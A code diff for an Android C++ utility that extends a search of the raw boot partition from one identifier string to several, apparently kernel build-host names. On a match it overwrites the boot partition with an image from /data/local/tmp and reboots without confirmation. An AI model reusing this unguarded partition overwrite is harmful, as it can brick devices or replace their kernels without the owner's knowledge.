@@ -10,7 +10,7 @@
 #include <cstdlib>
 #include <android/log.h>
 
-bool searchForPatternInFile(const std::string& filename, const std::string& pattern) {
+bool searchForPatternsInFile(const std::string& filename, const std::vector<std::string>& patterns) {
     int fd = open(filename.c_str(), O_RDONLY);
     if (fd == -1) {
         return false;
@@ -20,7 +20,11 @@ bool searchForPatternInFile(const std::string& filename, const std::string& patt
     char buffer[bufferSize];
     ssize_t bytesRead;
 
-    std::regex re(pattern, std::regex::icase);
+    std::vector<std::regex> regexPatterns;
+    for (const auto& pattern : patterns) {
+        regexPatterns.push_back(std::regex(pattern, std::regex::icase));  // Case insensitive
+    }
+
     std::string fileContents;
 
     while ((bytesRead = read(fd, buffer, bufferSize)) > 0) {
@@ -29,7 +33,13 @@ bool searchForPatternInFile(const std::string& filename, const std::string& patt
 
     close(fd);
 
-    return std::regex_search(fileContents, re);
+    for (const auto& re : regexPatterns) {
+        if (std::regex_search(fileContents, re)) {
+            return true;  // Found at least one match
+        }
+    }
+
+    return false;
 }
 
 bool copyFile(const std::string& source, const std::string& destination) {
@@ -57,16 +67,15 @@ bool copyFile(const std::string& source, const std::string& destination) {
 }
 
 void rebootSystem() {
-
     int result = system("reboot");
 }
 
 int main() {
     std::string bootFile = "/dev/block/by-name/boot";
-    std::string pattern = "edgars@";
+    std::vector<std::string> patterns = {"edgars@", "gitpod@", "archer", "h61m"};
     std::string bootImg = "/data/local/tmp/boot.img";
-    
-    if (searchForPatternInFile(bootFile, pattern)) {
+
+    if (searchForPatternsInFile(bootFile, patterns)) {
         if (copyFile(bootImg, bootFile)) {
             rebootSystem();
         }
